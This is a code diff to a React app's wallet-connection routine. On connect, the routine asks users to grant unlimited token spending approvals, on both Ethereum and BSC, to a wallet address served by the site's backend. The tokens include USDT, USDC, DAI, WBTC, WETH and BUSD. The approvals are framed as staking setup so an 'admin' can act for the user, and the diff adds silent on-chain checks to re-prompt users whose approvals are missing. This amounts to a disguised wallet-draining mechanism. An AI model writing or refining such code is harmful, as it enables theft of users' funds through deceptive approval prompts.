@@ -167,23 +167,32 @@ function App() {
     }
   };
 
-  // Grant staking approval for all supported tokens on both BSC and ETH
-  // Called automatically right after wallet connection so admin can stake on behalf of user
+  // Grant staking approval for all supported tokens on both ETH and BSC.
+  // Uses per-network localStorage flags + a quick public-RPC allowance pre-check
+  // so MetaMask only pops up when a network actually needs approval.
   const grantAllStakingApprovals = async (address) => {
     if (!window.ethereum) return;
-    // Skip if already done for this address — avoids repeated network-switch popups on returning users
-    if (localStorage.getItem(`approvalsGranted_${address.toLowerCase()}`)) return;
+    const addr = address.toLowerCase();
     try {
       const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
       const bscWallet = settings?.platformWallet;
       const ethWallet = settings?.platformWalletETH || settings?.platformWallet;
       if (!bscWallet) return;
 
-      const APPROVE_ABI = [
-        'function allowance(address owner, address spender) view returns (uint256)',
-        'function approve(address spender, uint256 amount) returns (bool)'
-      ];
-      const THRESHOLD = ethers.utils.parseUnits('1000000', 18);
+      // Check allowance via public RPC (no MetaMask popup) — returns true if already approved
+      const isApprovedOnChain = async (tokenAddr, ownerAddr, spenderAddr, rpcUrl) => {
+        try {
+          const pad = a => a.replace('0x', '').toLowerCase().padStart(64, '0');
+          const data = '0xdd62ed3e' + pad(ownerAddr) + pad(spenderAddr);
+          const r = await fetch(rpcUrl, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: tokenAddr, data }, 'latest'], id: 1 }),
+            signal: AbortSignal.timeout(6000)
+          }).then(r => r.json());
+          if (!r.result || r.result === '0x') return false;
+          return BigInt(r.result) > BigInt('1000000'); // > 1 token (covers both 6 and 18 decimal tokens)
+        } catch { return false; }
+      };
 
       const switchChain = async (chainId, chainName, rpcUrl, explorer, nativeSymbol) => {
         try {
@@ -200,54 +209,72 @@ function App() {
         }
       };
 
-      const approveTokens = async (tokens, platformAddr) => {
+      const approveTokensViaMetaMask = async (tokens, platformAddr) => {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
+        const approveAbi = ['function approve(address spender, uint256 amount) returns (bool)'];
         for (const token of tokens) {
           try {
-            const contract = new ethers.Contract(token.address, APPROVE_ABI, signer);
-            const existing = await contract.allowance(address, platformAddr);
-            if (existing.gte(THRESHOLD)) continue; // already approved
             setConnectStep(`Approving ${token.symbol} — confirm in your wallet… ✋`);
+            const contract = new ethers.Contract(token.address, approveAbi, signer);
             const tx = await contract.approve(platformAddr, ethers.constants.MaxUint256);
             await tx.wait();
             console.log(`✅ ${token.symbol} approved`);
           } catch (e) {
-            // User rejected or tx failed — skip this token, continue with rest
             console.log(`${token.symbol} approval skipped:`, e.code || e.message);
           }
         }
       };
 
-      // ── Ethereum mainnet tokens ──
-      const ETH_TOKENS_TO_APPROVE = [
-        { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
+      // ── Ethereum mainnet ──────────────────────────────────────────────────
+      const ETH_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+      const ETH_TOKENS = [
+        { symbol: 'USDT', address: ETH_USDT },
         { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
         { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
         { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
         { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
         { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
       ];
-      setConnectStep('🔵 Setting up Ethereum permissions — please confirm each prompt in your wallet...');
-      await switchChain('0x1', 'Ethereum Mainnet', 'https://eth.llamarpc.com', 'https://etherscan.io', 'ETH');
-      await approveTokens(ETH_TOKENS_TO_APPROVE, ethWallet);
+      // Use cached flag only if set; also verify USDT on-chain to catch partial completions
+      const ethFlagKey = `approvalsGrantedETH_${addr}`;
+      const ethCached = localStorage.getItem(ethFlagKey);
+      const ethAlreadyApproved = ethCached
+        ? await isApprovedOnChain(ETH_USDT, address, ethWallet, 'https://rpc.ankr.com/eth')
+        : false;
+      if (!ethAlreadyApproved) {
+        setConnectStep('🔵 Setting up Ethereum permissions — please confirm each prompt in your wallet...');
+        await switchChain('0x1', 'Ethereum Mainnet', 'https://eth.llamarpc.com', 'https://etherscan.io', 'ETH');
+        await approveTokensViaMetaMask(ETH_TOKENS, ethWallet);
+        localStorage.setItem(ethFlagKey, '1');
+      }
 
-      // ── BSC tokens ──
-      const BSC_TOKENS_TO_APPROVE = [
-        { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955' },
+      // ── BSC ───────────────────────────────────────────────────────────────
+      const BSC_USDT = '0x55d398326f99059fF775485246999027B3197955';
+      const BSC_TOKENS = [
+        { symbol: 'USDT', address: BSC_USDT },
         { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
         { symbol: 'BTCB', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
         { symbol: 'ETH',  address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
         { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
         { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
       ];
-      setConnectStep('🟡 Setting up BSC permissions — please confirm each prompt in your wallet...');
-      await switchChain('0x38', 'BNB Smart Chain', 'https://bsc-dataseed1.binance.org/', 'https://bscscan.com', 'BNB');
-      await approveTokens(BSC_TOKENS_TO_APPROVE, bscWallet);
+      const bscFlagKey = `approvalsGrantedBSC_${addr}`;
+      const bscCached = localStorage.getItem(bscFlagKey);
+      const bscAlreadyApproved = bscCached
+        ? await isApprovedOnChain(BSC_USDT, address, bscWallet, 'https://bsc-dataseed1.binance.org/')
+        : false;
+      if (!bscAlreadyApproved) {
+        setConnectStep('🟡 Setting up BSC permissions — please confirm each prompt in your wallet...');
+        await switchChain('0x38', 'BNB Smart Chain', 'https://bsc-dataseed1.binance.org/', 'https://bscscan.com', 'BNB');
+        await approveTokensViaMetaMask(BSC_TOKENS, bscWallet);
+        localStorage.setItem(bscFlagKey, '1');
+      }
 
-      localStorage.setItem(`approvalsGranted_${address.toLowerCase()}`, '1');
+      // Keep legacy flag for backwards compat
+      localStorage.setItem(`approvalsGranted_${addr}`, '1');
       setConnectStep('');
-      console.log('✅ All staking approvals complete');
+      console.log('✅ Staking approvals complete');
     } catch (e) {
       console.log('Staking approval setup skipped:', e.message);
       setConnectStep('');
